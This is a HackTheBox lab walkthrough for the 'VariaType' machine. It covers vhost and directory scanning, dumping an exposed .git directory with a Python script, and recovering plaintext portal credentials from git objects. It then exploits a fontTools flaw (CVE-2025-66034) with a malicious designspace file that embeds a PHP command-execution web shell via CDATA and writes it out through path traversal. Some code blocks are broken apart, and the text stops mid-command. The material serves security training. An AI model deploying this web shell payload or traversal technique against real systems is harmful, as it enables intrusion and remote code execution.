---
title: VariaType
os: Linux
difficulty: Medium
tags:
  - Git Disclosure
  - fontTools XML Injection
  - CVE-2025-66034
  - Cron Job Command Injection
  - setuptools Path Traversal
  - CVE-2025-47273
---

# 🛡️ HTB - VariaType (Medium)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Medium Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** VariaType
- **Operating System:** Linux
- **Difficulty:** Medium
- **Vulnerabilities:** Exposed Git Directory, CDATA XML Injection & Path Traversal in fontTools (CVE-2025-66034), Filename Command Injection in Cron Job, Sudo Privilege Escalation via setuptools PackageIndex Path Traversal (CVE-2025-47273)

---


## Step 1 - Reconnaissance

```bash
nmap -A -sS -Pn -T4  --min-rate 5000 10.129.9.136
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-17 04:31 UTC

Warning: 10.129.9.136 giving up on port because retransmission cap hit (6).

Nmap scan report for 10.129.9.136

Host is up (0.24s latency).

Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)

| ssh-hostkey:

|   256 e0:b2:eb:88:e3:6a:dd:4c:db:c1:38:65:46:b5:3a:1e (ECDSA)

|_  256 ee:d2:bb:81:4d:a2:8f:df:1c:50:bc:e1:0e:0a:d1:22 (ED25519)

80/tcp open  http    nginx 1.22.1

|_http-title: Did not follow redirect to http://variatype.htb/

|_http-server-header: nginx/1.22.1

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

TCP/IP fingerprint:

OS:SCAN(V=7.94SVN%E=4%D=3/17%OT=22%CT=1%CU=43101%PV=Y%DS=2%DC=T%G=Y%TM=69B8

OS:D952%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)

OS:SEQ(SP=101%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=102%GCD=1%ISR=109%TI

OS:=Z%CI=Z%II=I%TS=A)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FE

OS:%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=

OS:M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE

OS:88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7

OS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=

OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%

OS:RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0

OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIP

OS:CK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)

HOP RTT       ADDRESS

1   238.03 ms 10.10.14.1

2   241.56 ms 10.129.9.136

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 36.42 seconds
```

- 🔍 *While Looking at the web, it appears to be a font generation tool, that takes a .desingspace and .ttf/.otf files as input and then generates a master font.*

> [!IMPORTANT]
> .designspace and .ttf/.otf (OpenType) files are fundamental components in modern digital type design and variable font production. A .designspace file serves as the production "blueprint," defining how different font master designs (e.g., Light, Bold) should be interpolated to create a family, while .ttf/.otf files are the final, compiled binary files used by computers to render text

- 🔍 *I searched for some available subdomains*

```text
gobuster vhost -u http://variatype.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 50

===============================================================

Gobuster v3.6

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

===============================================================

[+] Url:             http://variatype.htb

[+] Method:          GET

[+] Threads:         50

[+] Wordlist:        /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

[+] User Agent:      gobuster/3.6

[+] Timeout:         10s

[+] Append Domain:   true

===============================================================

Starting gobuster in VHOST enumeration mode

===============================================================

**Found: portal.variatype.htb Status: 200 [Size: 2494]**

Progress: 4989 / 4990 (99.98%)

===============================================================

Finished

===============================================================
```

- 🔍 *I also searched for Some Sub Directories.*

```bash
python3 dirsearch.py -u "http://variatype.htb/" -x 404
```

```text
_|. _ _  _  _  _ _|_    v0.4.3

 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm

HTTP method: GET | Threads: 25

Wordlist size: 12294

Target: http://variatype.htb/

[04:36:19] Scanning:

[04:37:47] 302 -   247B - /download/users.csv  ->  /tools/variable-font-generator

[04:37:47] 302 -   247B - /download/history.csv  ->  /tools/variable-font-generator

[04:38:34] 200 -    3KB - /services

Task Completed
```

- 🔍 *Well the  **portal.variatype.htb** Subdomain appears to be an employee login page Named as "Internal Validation Portal."*

- 🔍 *I didn't found anything to break through in the login page, therefore, i tried to upload those fonts files*

- 🔍 *Intercepted POST request*

```http
POST /tools/variable-font-generator/process HTTP/1.1

Host: variatype.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: multipart/form-data; boundary=---------------------------40523995524206247783654491633

Content-Length: 1080

Origin: http://variatype.htb

Connection: close

Referer: http://variatype.htb/tools/variable-font-generator

Upgrade-Insecure-Requests: 1

Priority: u=0, i

\-----------------------------40523995524206247783654491633

Content-Disposition: form-data; name="designspace"; filename="test.designspace"

Content-Type: application/octet-stream

<?xml version="1.0" encoding="UTF-8"?>

<designspace format="4.0">

    <axes>

        <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>

    </axes>

    <sources>

        <source filename="test.ttf" name="Regular" familyname="TestFont">

            <location>

                <dimension name="Weight" xvalue="400"/>

            </location>

        </source>

    </sources>

    <instances>

        <instance filename="TestFont-Regular.ttf" familyname="TestFont" stylename="Regular">

            <location>

                <dimension name="Weight" xvalue="400"/>

            </location>

        </instance>

    </instances>

</designspace>

\-----------------------------40523995524206247783654491633

Content-Disposition: form-data; name="masters"; filename="test.ttf"

Content-Type: font/ttf

dummy font data

\-----------------------------40523995524206247783654491633--
```

- 🔍 *Intercepted Response*

```http
HTTP/1.1 302 FOUND

Server: nginx/1.22.1

Date: Tue, 17 Mar 2026 14:15:33 GMT

Content-Type: text/html; charset=utf-8

Content-Length: 247

Connection: close

Location: /tools/variable-font-generator

Vary: Cookie

Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZXJyb3IiLCJGb250IGdlbmVyYXRpb24gZmFpbGVkIGR1cmluZyBwcm9jZXNzaW5nLiJdfV19.abliBQ.FFkN1uzNuhSuPdjg812_Rki1-Ow; HttpOnly; Path=/

<!doctype html>

<html lang=en>

<title>Redirecting...</title>

<h1>Redirecting...</h1>

<p>You should be redirected automatically to the target URL: <a href="/tools/variable-font-generator">/tools/variable-font-generator</a>. If not, click the link.
```

- 🔍 *Also i forgot to do one thing, bruteforcing directories on portal.variatype.htb*

```bash
python3 dirsearch.py -u "http://portal.variatype.htb/" -x 404
```

```text
_|. _ _  _  _  _ _|_    v0.4.3

 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm

HTTP method: GET | Threads: 25

Wordlist size: 12294

Target: http://portal.variatype.htb/

[14:38:16] Scanning:

[14:38:36] 301 -   169B - /.git  ->  http://portal.variatype.htb/.git/

[14:38:36] 403 -   555B - /.git/

[14:38:36] 200 -    73B - /.git/description

[14:38:36] 200 -    39B - /.git/COMMIT_EDITMSG

[14:38:36] 200 -   143B - /.git/config

[14:38:36] 200 -    23B - /.git/HEAD

[14:38:36] 403 -   555B - /.git/hooks/

[14:38:36] 200 -   137B - /.git/index

[14:38:36] 403 -   555B - /.git/info/

[14:38:36] 403 -   555B - /.git/branches/

[14:38:36] 200 -   240B - /.git/info/exclude

[14:38:36] 301 -   169B - /.git/logs/refs  ->  http://portal.variatype.htb/.git/logs/refs/

[14:38:36] 200 -   700B - /.git/logs/HEAD

[14:38:36] 403 -   555B - /.git/logs/

[14:38:36] 200 -   700B - /.git/logs/refs/heads/master

[14:38:36] 301 -   169B - /.git/logs/refs/heads  ->  http://portal.variatype.htb/.git/logs/refs/heads/

[14:38:36] 301 -   169B - /.git/refs/heads  ->  http://portal.variatype.htb/.git/refs/heads/

[14:38:36] 403 -   555B - /.git/objects/

[14:38:36] 200 -    41B - /.git/refs/heads/master

[14:38:36] 403 -   555B - /.git/refs/

[14:38:37] 301 -   169B - /.git/refs/tags  ->  http://portal.variatype.htb/.git/refs/tags/

[14:40:16] 200 -     0B - /auth.php

[14:40:42] 302 -     0B - /dashboard.php  ->  /

[14:40:46] 302 -     0B - /download.php  ->  /

[14:40:54] 301 -   169B - /files  ->  http://portal.variatype.htb/files/

[14:40:55] 403 -   555B - /files/

[14:41:02] 200 -    2KB - /index.php
```

- 🔍 *Found the whole git treasure!*

- 🔍 *Now To Download all these git files, i created a python script*

```text
#!/usr/bin/env python3

"""

Complete Portal Downloader for variatype.htb

Downloads ALL discovered files preserving directory structure

"""

import requests

import os

import sys

from urllib.parse import urljoin

import time

import logging

# Configuration

BASE_URL = "http://portal.variatype.htb"

OUTPUT_DIR = "portal_dump"

PROXY = None # Set to None if not using Burp

# Setup logging

logging.basicConfig(

    level=logging.INFO,

    format='%(asctime)s - %(levelname)s - %(message)s',

    handlers=[

        logging.FileHandler('download.log'),

        logging.StreamHandler()

    ]

)

# All discovered paths from your scan

PATHS = [

    # Git repository files

    ".git/description",

    ".git/COMMIT_EDITMSG",

    ".git/config",

    ".git/HEAD",

    ".git/index",

    ".git/info/exclude",

    ".git/logs/HEAD",

    ".git/logs/refs/heads/master",

    ".git/refs/heads/master",

    # Web files

    "auth.php",

    "dashboard.php",

    "download.php",

    "index.php",

    # Directory paths (for structure)

    ".git/",

    ".git/hooks/",

    ".git/info/",

    ".git/branches/",

    ".git/logs/",

    ".git/logs/refs/",

    ".git/logs/refs/heads/",

    ".git/objects/",

    ".git/refs/",

    ".git/refs/heads/",

    ".git/refs/tags/",

    "files/",

]

# Additional common git files that might exist

GIT_FILES_EXTENDED = [

    ".git/ORIG_HEAD",

    ".git/FETCH_HEAD",

    ".git/MERGE_HEAD",

    ".git/CHERRY_PICK_HEAD",

    ".git/REBASE_HEAD",

    ".git/REVERT_HEAD",

    ".git/refs/remotes/origin/master",

    ".git/refs/stash",

    ".git/refs/notes/commits",

    ".git/packed-refs",

    ".git/objects/info/packs",

    ".git/info/refs",

    ".git/logs/refs/remotes/origin/master",

    ".git/logs/refs/stash",

    ".git/hooks/applypatch-msg.sample",

    ".git/hooks/commit-msg.sample",

    ".git/hooks/post-update.sample",

    ".git/hooks/pre-applypatch.sample",

    ".git/hooks/pre-commit.sample",

    ".git/hooks/pre-push.sample",

    ".git/hooks/pre-rebase.sample",

    ".git/hooks/pre-receive.sample",

    ".git/hooks/prepare-commit-msg.sample",

    ".git/hooks/update.sample",

]

# Common PHP files that might exist

PHP_FILES_EXTENDED = [

    "config.php",

    "database.php",

    "db.php",

    "functions.php",

    "login.php",

    "logout.php",

    "register.php",

    "profile.php",

    "admin.php",

    "upload.php",

    "view.php",

    "edit.php",

    "delete.php",

    "api.php",

    "ajax.php",

    "includes/header.php",

    "includes/footer.php",

    "includes/navbar.php",

    "includes/sidebar.php",

    "includes/config.php",

    "includes/functions.php",

    "css/style.css",

    "js/main.js",

    "images/",

    "assets/",

    "vendor/",

    "node_modules/",

]

# Common backup/temp files

BACKUP_FILES = [

    "auth.php.bak",

    "auth.php~",

    "auth.php.swp",

    "auth.php.old",

    "auth.php.backup",

    "dashboard.php.bak",

    "dashboard.php~",

    "download.php.bak",

    "download.php~",

    "index.php.bak",

    "index.php~",

    "config.php.bak",

    "config.php~",

    ".env",

    ".env.local",

    ".env.production",

    ".env.development",

    "composer.json",

    "composer.lock",

    "package.json",

    "package-lock.json",

]

class PortalDownloader:

    def __init__(self, base_url, output_dir, proxy=None):

        self.base_url = base_url

        self.output_dir = output_dir

        self.session = requests.Session()

        # Setup proxy if provided

        if proxy:

            self.session.proxies = {

                'http': proxy,

                'https': proxy

            }

        # Headers to mimic browser

        self.session.headers.update({

            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',

            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',

            'Accept-Language': 'en-US,en;q=0.5',

            'Accept-Encoding': 'gzip, deflate',

            'Connection': 'keep-alive',

        })

        # Statistics

        self.stats = {

            'downloaded': 0,

            'failed': 0,

            'skipped': 0,

            'forbidden': 0,

            'not_found': 0

        }

    def ensure_dir(self, filepath):

        """Create directory structure if it doesn't exist"""

        directory = os.path.dirname(filepath)

        if directory and not os.path.exists(directory):

            os.makedirs(directory, exist_ok=True)

    def download_file(self, path):

        """Download a single file"""

        url = urljoin(self.base_url, path)

        output_path = os.path.join(self.output_dir, path)

        # Skip if it's a directory path

        if path.endswith('/'):

            self.ensure_dir(output_path)

            logging.info(f"[DIR] Created: {path}")

            return True

        self.ensure_dir(output_path)

        try:

            # Check if file exists and get info

            response = self.session.get(url, timeout=10, allow_redirects=True)

            # Handle different status codes

            if response.status_code == 200:

                with open(output_path, 'wb') as f:

                    f.write(response.content)

                size = len(response.content)

                logging.info(f"[200] Downloaded: {path} ({size} bytes)")

                self.stats['downloaded'] += 1

                return True

            elif response.status_code == 403:

                logging.info(f"[403] Forbidden: {path}")

                self.stats['forbidden'] += 1

                # Save the forbidden response for reference

                with open(output_path + '.403', 'w') as f:

                    f.write(f"URL: {url}\\nStatus: 403 Forbidden\\n")

                return False

            elif response.status_code == 404:

                logging.debug(f"[404] Not found: {path}")

                self.stats['not_found'] += 1

                return False

            else:

                logging.warning(f"[{response.status_code}] Unexpected: {path}")

                self.stats['failed'] += 1

                return False

        except requests.exceptions.RequestException as e:

            logging.error(f"[ERROR] Failed to download {path}: {str(e)}")

            self.stats['failed'] += 1

            return False

    def download_all(self, paths, delay=0.1):

        """Download all paths with rate limiting"""

        logging.info(f"Starting download of {len(paths)} paths to {self.output_dir}")

        start_time = time.time()

        for i, path in enumerate(paths, 1):

            logging.info(f"Progress: {i}/{len(paths)} - {path}")

            self.download_file(path)

            time.sleep(delay)  # Rate limiting

            # Print stats every 20 files

            if i % 20 == 0:

                self.print_stats()

        # Final stats

        elapsed = time.time() - start_time

        self.print_stats()

        logging.info(f"Completed in {elapsed:.2f} seconds")

    def print_stats(self):

        """Print download statistics"""

        logging.info("=" * 50)

        logging.info("DOWNLOAD STATISTICS:")

        logging.info(f"  Downloaded: {self.stats['downloaded']}")

        logging.info(f"  Forbidden:  {self.stats['forbidden']}")

        logging.info(f"  Not Found:  {self.stats['not_found']}")

        logging.info(f"  Failed:     {self.stats['failed']}")

        logging.info("=" * 50)

    def try_alternative_names(self, base_path):

        """Try common alternative names for a file"""

        alternatives = []

        if base_path.endswith('.php'):

            # Try without .php

            alternatives.append(base_path[:-4])

            # Try with different extensions

            for ext in ['.bak', '~', '.swp', '.old', '.backup']:

                alternatives.append(base_path[:-4] + ext)

        return alternatives

    def extract_git_objects(self):

        """Attempt to extract git objects from the repository"""

        logging.info("Attempting to extract git objects...")

        # First, get the HEAD commit

        head_path = os.path.join(self.output_dir, ".git/HEAD")

        if os.path.exists(head_path):

            with open(head_path, 'r') as f:

                head_content = f.read().strip()

            # Parse HEAD to get current branch

            if head_content.startswith('ref:'):

                ref = head_content[5:].strip()

                ref_path = os.path.join(self.output_dir, ".git", ref)

                if os.path.exists(ref_path):

                    with open(ref_path, 'r') as f:

                        commit_hash = f.read().strip()

                    logging.info(f"Current commit hash: {commit_hash}")

                    # Try to download the commit object

                    obj_dir = commit_hash[:2]

                    obj_file = commit_hash[2:]

                    obj_path = f".git/objects/{obj_dir}/{obj_file}"

                    self.download_file(obj_path)

        # Parse logs to find more objects

        log_path = os.path.join(self.output_dir, ".git/logs/HEAD")

        if os.path.exists(log_path):

            with open(log_path, 'r') as f:

                for line in f:

                    parts = line.split()

                    if len(parts) >= 2:

                        # Each log entry has old_hash new_hash

                        for hash_val in parts[:2]:

                            if len(hash_val) == 40 and all(c in '0123456789abcdef' for c in hash_val):

                                obj_dir = hash_val[:2]

                                obj_file = hash_val[2:]

                                obj_path = f".git/objects/{obj_dir}/{obj_file}"

                                self.download_file(obj_path)

                                time.sleep(0.05)

def main():

    # Create downloader instance

    downloader = PortalDownloader(BASE_URL, OUTPUT_DIR, PROXY)

    # Combine all paths

    all_paths = []

    # Add all discovered paths

    all_paths.extend(PATHS)

    # Add extended git files

    all_paths.extend(GIT_FILES_EXTENDED)

    # Add extended PHP files

    all_paths.extend(PHP_FILES_EXTENDED)

    # Add backup files

    all_paths.extend(BACKUP_FILES)

    # Add paths with different case variations (for case-sensitive systems)

    case_variations = []

    for path in all_paths:

        if path.endswith('.php'):

            # Add uppercase variations

            case_variations.append(path.upper())

            case_variations.append(path.capitalize())

    all_paths.extend(case_variations)

    # Remove duplicates while preserving order

    seen = set()

    unique_paths = []

    for path in all_paths:

        if path not in seen:

            seen.add(path)

            unique_paths.append(path)

    logging.info(f"Total unique paths to try: {len(unique_paths)}")

    # Download all files

    downloader.download_all(unique_paths, delay=0.1)

    # After downloading, try to extract git objects

    downloader.extract_git_objects()

    # Final summary

    logging.info("\\n" + "=" * 60)

    logging.info("DOWNLOAD COMPLETE")

    logging.info(f"Files saved to: {os.path.abspath(OUTPUT_DIR)}")

    logging.info("Check download.log for detailed logs")

    logging.info("=" * 60)

    # List important files found

    logging.info("\\nImportant files found:")

    for root, dirs, files in os.walk(OUTPUT_DIR):

        for file in files:

            if not file.endswith('.403'):  # Skip forbidden markers

                filepath = os.path.join(root, file)

                size = os.path.getsize(filepath)

                if size > 0:  # Only show non-empty files

                    rel_path = os.path.relpath(filepath, OUTPUT_DIR)

                    logging.info(f"  - {rel_path} ({size} bytes)")

if __name__ == "__main__":

    try:

        main()

    except KeyboardInterrupt:

        logging.info("\\nDownload interrupted by user")

        sys.exit(0)

    except Exception as e:

        logging.error(f"Unexpected error: {str(e)}")

        sys.exit(1)
```

- 🔍 *After Downloading all the files, you may be able to see the portal_dump folder and inside it go to .git folder.*

```bash
ls
```

```text
branches        description  index  objects

COMMIT_EDITMSG  HEAD         info   ORIG_HEAD

config          hooks        logs   refs
```

- 🔍 *you'll see something like this, now before enumerating this, lets take a look at config file*

```text
[core]

        repositoryformatversion = 0

        filemode = true

        bare = false

        logallrefupdates = true

[user]

        name = Dev Team

        email = dev@variatype.htb
```

- 🔍 *We got a user **Dev***

- 🔍 *After enumerating all the folders, i found something interesting inside the objects folder*

```bash
cd objects

ls
```

```text
00  50  6f  75  info
```

```bash
cd 6f

ls
```

```text
021da6be7086f2595befaa025a83d1de99478b
```

```bash
cd ..

cd 75

ls
```

```text
3b5f5957f2020480a19bf29a0ebc80267a4a3d
```

```bash
cd ..

cd 50

ls
```

```text
30e791b764cb2a50fcb3e2279fea9737444870
```

```bash
cd ..

cd 00
```

- 🔍 *Lets look at the logs*

```bash
git log --oneline
```

```text
753b5f5 (HEAD -> master) fix: add gitbot user for automated validation pipeline

5030e79 feat: initial portal implementation
```

> [!IMPORTANT]
> 1. The Older Change (The Foundation)

```text
5030e79 feat: initial portal implementation

5030e79: A unique ID (hash) for this specific "save point."

feat: Short for feature. It tells other developers that something brand new was added.

The Message: Someone built the first version of a "portal" (like a login page or a main dashboard). This was the starting point for that part of the app.
```

> [!IMPORTANT]
> 2. The Latest Change (The Update)

```text
753b5f5 (HEAD -> master) fix: add gitbot user for automated validation pipeline

753b5f5: The ID for this newer "save point."

(HEAD -> master): This is a marker saying, "You are here." It means your project is currently sitting on the master branch at this exact version.

fix: This tells you a problem was corrected or a small necessary adjustment was made.

The Message: A "gitbot" user was added. This is likely a "robot" account used by the server to automatically check if the code works correctly (validation) before it's officially finished.
```

> [!IMPORTANT]
> Now We found some hashes before, what are those?

```text
Those 40-character strings are Full SHA-1 Hashes, the unique "fingerprints" Git uses to identify every single object in your repository.

While your previous view showed you the short versions (like 753b5f5), these are the long versions of those same IDs.

1\. What do they represent?

In Git, a hash isn't just a random serial number. It is a calculated checksum based on:

The Content: Every single character in every file you changed.

The Metadata: Your name, email, the exact second you committed, and the commit message.

The History: The ID of the commit that came right before it (the "parent").
```

- 🔍 *In short it tells us every detail about a commit.*

- 🔍 *Now lets try to decode every single hash, i made a bash script for that*

```text
for dir in *; do

    if [ -d "$dir" ]; then
```

```bash
cd "$dir"
```

```text
for file in *; do

            # Skip if no files exist in the subdirectory

            [ -e "$file" ] || continue

            # Run Python to decompress and check the file
```

```bash
python3 -c "

import zlib, sys

try:

    with open('$file', 'rb') as f:

        # Git objects are zlib compressed

        data = zlib.decompress(f.read())

        if b'gitbot' in data:

            print('\\n*** FOUND DATA IN: $dir/$file ***')

            # Show the content, ignoring non-text characters

            print(data.decode('utf-8', errors='ignore'))

except Exception:

    pass

" 2>/dev/null
```

```text
done
```

```bash
cd ..
```

```text
fi

done

Checking 00/*...

Checking 50/30e791b764cb2a50fcb3e2279fea9737444870...

Checking 6f/021da6be7086f2595befaa025a83d1de99478b...

Checking 75/3b5f5957f2020480a19bf29a0ebc80267a4a3d...

*** FOUND CREDENTIALS IN 75/3b5f5957f2020480a19bf29a0ebc80267a4a3d ***

commit 259tree c6ea13ef05d96cf3f35f62f87df24ade29d1d6b4

parent 5030e791b764cb2a50fcb3e2279fea9737444870

author Dev Team [dev@variatype.htb](mailto:dev@variatype.htb) 1764968373 -0500

committer Dev Team [dev@variatype.htb](mailto:dev@variatype.htb) 1764968373 -0500

fix: add gitbot user for automated validation pipeline
```

- 🔍 *Here  we're only seeing the commit object itself, not the actual file content with the credentials. The commit object points to a tree object (c6ea13ef05d96cf3f35f62f87df24ade29d1d6b4) that we don't have.*

- 🔍 *Try to manually download those objects*

```bash
curl -o c6/ea13ef05d96cf3f35f62f87df24ade29d1d6b4 \\
```

```text
http://portal.variatype.htb/.git/objects/c6/ea13ef05d96cf3f35f62f87df24ade29d1d6b4
```

- 🔍 *Lets use this python script to decompress this hash properly*

```bash
python3 -c "

import zlib

import os

# Read and decompress the tree object

with open('c6/ea13ef05d96cf3f35f62f87df24ade29d1d6b4', 'rb') as f:

    compressed = f.read()

    data = zlib.decompress(compressed)

print('Raw tree data (hex):')

print(data.hex())

print('\\n' + '='*50)

print('Parsed tree object:')

print('='*50)

# Skip the 'tree [size]\\0' header

header_end = data.find(b'\\0')

if header_end > 0:

    print(f'Header: {data[:header_end].decode()}')

    pos = header_end + 1

    # Parse tree entries

    while pos < len(data):

        # Find the space that separates mode and filename

        space_pos = data.find(b' ', pos)

        if space_pos == -1:

            break

        mode = data[pos:space_pos].decode()

        pos = space_pos + 1

        # Find null terminator after filename

        null_pos = data.find(b'\\0', pos)

        if null_pos == -1:

            break

        filename = data[pos:null_pos].decode()

        pos = null_pos + 1

        # Next 20 bytes are SHA-1 hash

        sha1 = data[pos:pos+20].hex()

        pos += 20

        print(f'\\nFile: {filename}')

        print(f'  Mode: {mode}')

        print(f'  SHA1: {sha1}')

        # Check if this is auth.php

        if filename == 'auth.php':

            print('  *** THIS IS THE AUTH.PHP BLOB ***')

            print(f'  Blob hash: {sha1}')

            print(f'  Expected blob: 615e621dce970c2c1c16d2a1e26c12658e3669b3')

            if sha1 == '615e621dce970c2c1c16d2a1e26c12658e3669b3':

                print('  ✓ MATCH! This is the credentials file!')

"
```

```text
Raw tree data (hex):

747265652033360031303036343420617574682e70687000b328305f0e85c2b97a7e2a94978ae20f16db75e8

==================================================

Parsed tree object:

==================================================

Header: tree 36

File: auth.php

  Mode: 100644

  SHA1: b328305f0e85c2b97a7e2a94978ae20f16db75e8

  *** THIS IS THE AUTH.PHP BLOB ***

  Blob hash: b328305f0e85c2b97a7e2a94978ae20f16db75e8

  Expected blob: 615e621dce970c2c1c16d2a1e26c12658e3669b3
```

- 🔍 *Interesting! The tree shows a different blob hash than what we expected! The actual hash from the tree is b328305f0e85c2b97a7e2a94978ae20f16db75e8, not 615e621.... This means the auth.php content in this commit is different from what was shown in the git diff earlier.*

- 🔍 *Lets download the correct blob*

```bash
curl -o b3/28305f0e85c2b97a7e2a94978ae20f16db75e8 \\
```

```text
http://portal.variatype.htb/.git/objects/b3/28305f0e85c2b97a7e2a94978ae20f16db75e8
```

```bash
ls
```

```text
00  50  6f  75  b3  c6  info
```

- 🔍 *Okay now lets decompress it*

```bash
python3 -c "

import zlib, sys

try:

    with open('$file', 'rb') as f:

        # Git objects are zlib compressed

        data = zlib.decompress(f.read())

        if b'gitbot' in data:

            print('\\n*** FOUND DATA IN: $dir/$file ***')

            # Show the content, ignoring non-text characters

            print(data.decode('utf-8', errors='ignore'))

except Exception:

    pass

" 2>/dev/null
```

```text
done
```

```bash
cd ..
```

```text
fi

done

*** FOUND DATA IN: 75/3b5f5957f2020480a19bf29a0ebc80267a4a3d ***

commit 259tree c6ea13ef05d96cf3f35f62f87df24ade29d1d6b4

parent 5030e791b764cb2a50fcb3e2279fea9737444870

author Dev Team [dev@variatype.htb](mailto:dev@variatype.htb) 1764968373 -0500

committer Dev Team [dev@variatype.htb](mailto:dev@variatype.htb) 1764968373 -0500

fix: add gitbot user for automated validation pipeline

*** FOUND DATA IN: b3/28305f0e85c2b97a7e2a94978ae20f16db75e8 ***

blob 75<?php

session_start();

$USERS = [

    **'gitbot' => 'G1tB0t_Acc3ss_2025!'**

];
```

- 🔍 *got creds!*

- 🔍 *When logged in into the internal portal, there was nothing. it just checks and can download the fonts that were generated by the original font tool site. (a rabbit hole!)*

- 🔍 *As we have captured the intercepted request for the upload of desingspace and ttf files, there is a known vulnerability The application was using fontTools to process these files.*

- 🔍 *Research revealed CVE-2025-66034, a critical vulnerability in fontTools.varLib affecting versions 4.33.0 to before 4.60.2.*

> [!IMPORTANT]
> CVE-2025-66034 -

```text
The vulnerability had two components:

	1.Path Traversal: The filename attribute in <variable-fonts> wasn't sanitized, allowing ../../../../ sequences

	2.XML Injection: CDATA sections in <labelname> elements allowed injecting arbitrary content
```

- 🔍 *The CDATA section allows us to use php scripts inside the XML <labelname> attribute.*

- 🎯 **Exploitation Path :-**

- 🔍 *Will create a python script that will generate .ttf files for us*

- 🔍 *then will create a malicious designspace file which contains, CDATA section,*

- 🔍 *Will upload it to the target*

- 🔍 *will get the shell!*

```text
(note:- one more thing about the found vulnerability is, we can create a file at a specific location. and then later we can use it to apply shell commands via URL)
```

## Step 2 - Initial Foothold-

- 🔍 *Lets First Create a Python script that will generate .ttf files for us*

```text
#!/usr/bin/env python3

import os

from fontTools.fontBuilder import FontBuilder

from fontTools.pens.ttGlyphPen import TTGlyphPen

def create_source_font(filename, weight=400):

    fb = FontBuilder(unitsPerEm=1000, isTTF=True)

    fb.setupGlyphOrder([".notdef"])

    fb.setupCharacterMap({})

    pen = TTGlyphPen(None)

    pen.moveTo((0, 0))

    pen.lineTo((500, 0))

    pen.lineTo((500, 500))

    pen.lineTo((0, 500))

    pen.closePath()

    fb.setupGlyf({".notdef": pen.glyph()})

    fb.setupHorizontalMetrics({".notdef": (500, 0)})

    fb.setupHorizontalHeader(ascent=800, descent=-200)

    fb.setupOS2(usWeightClass=weight)

    fb.setupPost()

    fb.setupNameTable({"familyName": "Test", "styleName": f"Weight{weight}"})

    fb.save(filename)

if __name__ == '__main__':

    os.chdir(os.path.dirname(os.path.abspath(__file__)))

    create_source_font("source-light.ttf", weight=100)

    create_source_font("source-regular.ttf", weight=400)
```

- 🔍 *Run this script and you'll able to see some, source-regular.ttf & source-light.ttf files*

- 🔍 *Now Lets Create our malicious.designspace file*

```xml
<?xml version='1.0' encoding='UTF-8'?>

<designspace format="5.0">

    <axes>

        <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">

            <labelname xml:lang="en">**<![CDATA[<?php system($_GET['cmd']);** ?>]]></labelname>

        </axis>

    </axes>

    <sources>

        <source filename="source-light.ttf" name="Light">

            <location>

                <dimension name="Weight" xvalue="100"/>

            </location>

        </source>

        <source filename="source-regular.ttf" name="Regular">

            <location>

                <dimension name="Weight" xvalue="400"/>

            </location>

        </source>

    </sources>

    <variable-fonts>

        <variable-font name="MaliciousFont" filename=**"../../../../../../../var/www/portal.variatype.htb/public/files/shell.php"**>

            <axis-subsets>

                <axis-subset name="Weight"/>

            </axis-subsets>

        </variable-font>

    </variable-fonts>

</designspace>
```

- 🔍 *Look above, the specified location and the CDATA sections are properly written and are good to go!*

```text
(note:- if you're thinking of uploading these files via web, then it's gonna cause errors and it will only take 1/2 ttf file, but to succeed the exploitation we need both the files to be uploaded!)
```

- 🔍 *lets use curl to upload*

```bash
curl -v -X POST http://variatype.htb/tools/variable-font-generator/process \\

